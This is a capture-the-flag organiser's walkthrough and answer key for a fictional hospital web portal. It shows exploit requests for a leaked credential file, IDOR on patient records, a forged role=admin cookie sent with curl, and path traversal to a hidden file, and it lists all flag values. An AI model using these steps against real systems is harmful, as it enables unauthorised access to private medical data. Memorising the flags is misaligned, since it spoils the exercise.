# 🔐 Walkthrough — Mercury General Hospital CTF
> **FOR CTF ORGANIZERS ONLY — do not distribute to players**

---

## Overview

| Flag   | Name                | Vulnerability                               | Difficulty |
|--------|---------------------|---------------------------------------------|------------|
| FLAG 3 | The Dental Record   | IDOR (Insecure Direct Object Reference)     | Easy       |
| FLAG 4 | The Security Footage| Broken Access Control (cookie manipulation) | Easy-Medium |
| FLAG 5 | The Prescription    | Path Traversal + Base64 decode              | Medium     |

---

## Entry Point — robots.txt Recon + Credential Discovery

Every engagement starts with reconnaissance. This CTF rewards players who follow
standard web-app recon methodology.

### Step 1 — Visit robots.txt

```
http://<TARGET>/robots.txt
```

Output:

```
User-agent: *
Disallow: /staff-backup/
Disallow: /admin-console/

# Note to webmaster: please confirm /staff-backup/ is not publicly accessible
# before the portal goes live — IT generated credential backup files there.
# Also: prescription archive not yet moved off the web root.
#   Current path: ../hospital-files/prescriptions/
```

Two interesting paths immediately: `/staff-backup/` and `/admin-console/`.

### Step 2 — Read the credential backup

```
http://<TARGET>/staff-backup/credentials.txt
```

Output (abbreviated):

```
Username : reception
Password : W0lfpack2009!
Role     : staff
```

### Step 3 — Log in

Navigate to `http://<TARGET>/login.php` and log in with:
- **Username:** `reception`
- **Password:** `W0lfpack2009!`

You are authenticated as `role: staff`.

---

## FLAG 3 — The Dental Record

**Vulnerability:** IDOR — Insecure Direct Object Reference

### Exploit

1. Log in as `reception`. Navigate to **Patient Records**.
2. Search for `MGH` — three patients appear: **MGH-0042**, **MGH-0043**, **MGH-0044**.
   Basic info only is shown in the search results.
3. Click **View** on MGH-0044 (Stuart Price), or request directly:

```
http://<TARGET>/records.php?pid=MGH-0044
```

The full physician notes and the flag are returned — **no role check** exists on the
detail endpoint. Any authenticated user can access any patient's complete record.

```
FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}
```

**Why it's IDOR:** The `pid` parameter is an Insecure Direct Object Reference.
The server validates authentication but not authorization.

---

## FLAG 4 — The Security Footage

**Vulnerability:** Broken Access Control — client-controlled role cookie

### Discovery (two trails)

**Trail A — JavaScript source**

Open browser DevTools → Sources → `assets/js/portal.js`:

```javascript
// TODO (IT-2247): Move role authorisation fully server-side.
// Currently the portal reads the HTTP cookie 'role' on both the
// client (for UI rendering) and server (camera.php, dashboard).
// Any client can forge Cookie: role=admin to unlock restricted sections.
```

**Trail B — Admin console page source**

```
http://<TARGET>/admin-console/
```

View page source. The HTML comment block includes:

```html
<!--
  IMPORTANT — Role Access Control (temporary workaround):
    The portal reads the HTTP Cookie named 'role' BEFORE the session role.
    See camera.php, line: $_COOKIE['role'] ?? $session['role']
    Valid values: admin | doctor | staff
-->
```

### Exploit

1. Log in as `reception`. Navigate to **Security Logs**.
   Camera entries load but no flag boxes appear (role=staff).
2. View page source — see: `<!-- role-restricted content requires doctor or admin access -->`
3. Set a `role` cookie to `admin` using DevTools → Application → Cookies,
   or with a proxy (Burp Suite):

```
Cookie: PHPSESSID=<session>; role=admin
```

   One-liner with curl:
```bash
curl -b "PHPSESSID=<your_session>; role=admin" http://<TARGET>/camera.php
```

4. Reload. The flag box appears on the **CAM-03** entry:

```
FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}
```

---

## FLAG 5 — The Prescription

**Vulnerability:** Path Traversal on `files.php?file=`

### Discovery

`robots.txt` hints: `prescription archive not yet moved off the web root`.
The admin console source confirms: `Prescription archive path: ../hospital-files/prescriptions/hidden/`

### Exploit

The file viewer reads files relative to `docs/` but does **not sanitise `../`**:

```
http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
```

The file contains a Base64-encoded block. Decode it:

```bash
echo "V0FSRUhPVVNFIENPT1JESU5BVEVTOiAzNi4xMDI2IE4..." | base64 -d
```

Or use [CyberChef](https://gchq.github.io/CyberChef/).

Output:

```
WAREHOUSE COORDINATES: 36.1026 N, 115.1734 W | 3850 S Valley View Blvd, Las Vegas, NV 89103 | FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}
```

```
FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}
```

---

## Full Attack Chain

```
robots.txt
├── /staff-backup/credentials.txt  →  reception / W0lfpack2009!
│   │
│   ├── /records.php?pid=MGH-0044  →  IDOR  →  FLAG 3
│   │
│   ├── /camera.php
│   │   ├── /assets/js/portal.js  →  cookie TODO comment     ┐
│   │   ├── /admin-console/ source  →  cookie role hint      ├── forge Cookie:role=admin → FLAG 4
│   │   └── camera.php source comment  →  role hint          ┘
│   │
│   └── /files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
│       └── base64 decode  →  FLAG 5
│
└── /admin-console/  →  hints for FLAG 4 + FLAG 5
```

---

## All Flags

| Flag   | Value |
|--------|-------|
| FLAG 3 | `FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}` |
| FLAG 4 | `FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}` |
| FLAG 5 | `FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}` |
